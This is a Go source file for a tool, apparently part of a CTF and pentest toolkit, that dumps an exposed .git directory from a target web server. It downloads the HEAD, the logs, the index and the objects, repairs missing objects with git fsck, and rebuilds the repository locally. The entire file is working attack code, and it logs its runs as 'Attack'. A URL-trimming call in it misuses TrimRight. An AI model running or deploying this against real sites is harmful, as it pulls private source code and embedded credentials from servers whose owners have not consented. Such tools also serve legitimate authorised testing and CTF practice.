package githack

import (
	"bufio"
	"fmt"
	"io"
	"net/url"
	"os"
	"path/filepath"
	"regexp"
	"strings"

	"github.com/lizongshen/gocommand"
	"github.com/mozhu1024/virzz/logger"
	"github.com/mozhu1024/virzz/utils/downloader"
)

var baseFiles = []string{
	".git/ORIG_HEAD",
	".git/config",
	".git/HEAD",
	".git/info/exclude",
	".git/logs/HEAD",
	".git/logs/refs/heads/master",
	".git/logs/refs/stash",
	".git/description",
	".git/hooks/commit-msg.sample",
	".git/hooks/pre-rebase.sample",
	".git/hooks/pre-commit.sample",
	".git/hooks/applypatch-msg.sample",
	".git/hooks/fsmonitor-watchman.sample",
	".git/hooks/pre-receive.sample",
	".git/hooks/prepare-commit-msg.sample",
	".git/hooks/post-update.sample",
	".git/hooks/pre-applypatch.sample",
	".git/hooks/pre-push.sample",
	".git/hooks/update.sample",
	".git/refs/heads/master",
	".git/refs/stash",
	".git/index",
	".git/COMMIT_EDITMSG",
}

func parserURL(targetURL string) (resURL, tempDir string, err error) {
	_url, err := url.Parse(targetURL)
	if err != nil {
		return
	}
	tempDir = _url.Host
	for _, bad := range []string{".", "/", "\\", "'", "\"", ":"} {
		tempDir = strings.ReplaceAll(tempDir, bad, "_")
	}
	err = os.Mkdir(tempDir, 0700)
	if err != nil && !os.IsExist(err) {
		return
	}
	resURL = strings.TrimRight(targetURL, ".git/")
	resURL = strings.TrimRight(resURL, "/")
	return resURL, tempDir, nil
}

func fetchCommitObjects(downClient *downloader.Downloader, baseURL, tempDir string, stash bool) (err error) {
	var file *os.File
	if stash {
		if file, err = os.Open(filepath.Join(tempDir, ".git", "logs", "refs", "stash")); err != nil {
			return
		}
	} else {
		if file, err = os.Open(filepath.Join(tempDir, ".git", "logs", "refs", "heads", "master")); err != nil {
			return
		}
	}
	defer file.Close()
	br := bufio.NewReader(file)
	var (
		line    []byte
		hashArr []string
		curHash string
	)
	// download
	for {
		line, _, err = br.ReadLine()
		if err == io.EOF {
			break
		}
		hashArr = strings.Split(string(line), " ")
		if len(hashArr) < 3 {
			break
		}
		logger.Debug(hashArr)
		curHash = hashArr[1]
		target := filepath.Join(".git", "objects", curHash[:2], curHash[2:40])
		downClient.AddTask(fmt.Sprintf("%s/%s", baseURL, target), filepath.Join(tempDir, target))
	}
	return downClient.Start()
}

func fixMissingObjects(downClient *downloader.Downloader, baseURL, tempDir string) (err error) {
	logger.Debug("fixMissingObjects")
	var (
		cmd, out string
		matches  [][]string
	)
	cmd = fmt.Sprintf("cd ./%s && git fsck 2>&1", tempDir)
	if _, out, err = gocommand.NewCommand().Exec(cmd); err != nil {
		return
	}
	logger.Debug(out)
	matches = regexp.MustCompile(`(?m)([a-fA-F0-9]{40})`).FindAllStringSubmatch(out, -1)
	// matchMap := make(map[string]int)
	if len(matches) > 0 {
		for _, match := range matches {
			curHash := match[0]
			logger.Debug("Fetch Object", curHash)
			target := filepath.Join(".git", "objects", curHash[:2], curHash[2:40])
			downClient.AddTask(fmt.Sprintf("%s/%s", baseURL, target), filepath.Join(tempDir, target))
		}
		downClient.Start()
	}
	if len(matches) > 0 {
		fixMissingObjects(downClient.Reset(), baseURL, tempDir)
	}
	return nil
}

func gitHack(targetURL string, limit, delay int64) (err error) {
	var baseURL, tempDir string
	logger.Info("Attack [%s]\n", targetURL)

	if baseURL, tempDir, err = parserURL(targetURL); err != nil {
		return
	}
	logger.Debug("baseURL:", baseURL)
	logger.Debug("tempDir:", tempDir)
	// NewDownloader
	download := downloader.NewDownloader().SetLimit(limit).SetDelay(delay)
	// Download Base Files
	for _, uri := range baseFiles {
		download.AddTask(fmt.Sprintf("%s/%s", baseURL, uri), filepath.Join(tempDir, uri))
	}
	logger.Info("Fetch Base Files...")
	download.Start()

	// Fetch Commit Objects
	logger.Info("Fetch Commit Objects...")
	fetchCommitObjects(download, baseURL, tempDir, false)

	// Fetch Stash Objects
	logger.Info("Fetch Stash Objects...")
	fetchCommitObjects(download, baseURL, tempDir, true)

	// Fix Missing Objects
	logger.Info("Fetch Missing Objects...")
	fixMissingObjects(download, baseURL, tempDir)

	// Reset to the last commit
	cmd := fmt.Sprintf("cd ./%s && git reset --hard > /dev/null", tempDir)
	if _, _, err := gocommand.NewCommand().Exec(cmd); err != nil {
		return err
	}
	logger.Info("Fetched Info")
	return nil
}
